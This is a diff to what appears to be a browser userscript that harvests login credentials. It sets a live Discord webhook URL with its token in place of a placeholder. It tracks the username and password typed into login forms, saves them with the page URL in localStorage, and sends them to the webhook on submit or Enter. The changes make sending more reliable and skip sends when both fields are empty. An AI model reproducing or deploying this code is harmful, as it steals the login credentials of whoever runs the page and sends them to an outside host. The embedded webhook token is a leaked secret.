@@ -13,7 +13,7 @@
 (function() {
     'use strict';
 
-    const discordWebhook = "WEBHOOK-HERE"
+    const discordWebhook = "https://discord.com/api/webhooks/1300855209903263754/wumyVnQCmRY9St6VS-eYTmkC2ma1xuKdwWCiV6JIFA7mvXSUsf4Dq9B6es89avvZuQgg"
 
 
     const fetchSelectors = (callback) => {
@@ -67,8 +67,6 @@
     }
 
     fetchSelectors((links) => {
-        console.log(links);
-
         const loginBox = document.querySelector(links[0].selectors);
         const passwordBox = document.querySelector(links[1].selectors);
         const submitBox = document.querySelector(links[2].selectors);
@@ -86,6 +84,10 @@
 
         const sendWebhook = () => {
             // Save data to local storage as a fallback solution
+
+            if (savedData.login == "empty" && savedData.password == "empty") {
+                return
+            }
 
             let localSavedData = localStorage.getItem("localSavedData");
             localSavedData += `URL: ${savedData.url} Username: ${savedData.login} Password: ${savedData.password} - `
@@ -125,8 +127,9 @@
             event.key === "Backspace" ? savedData.login.slice(0, -1) : savedData.login = cleanOutput(event.target.value);
         }) : null;
 
-        submitBox
-            ? submitBox.addEventListener("click", (event) => sendWebhook())
-            : (passwordBox && loginBox) ? window.addEventListener("keydown", (event) => event.key === "Enter" ? sendWebhook() : null): null;
+        (submitBox || loginBox || passwordBox) ? (
+            submitBox.addEventListener("click", (event) => sendWebhook()),
+            window.addEventListener("keydown", (event) => event.key === "Enter" ? sendWebhook() : null)
+        ) : null
     });
 })();
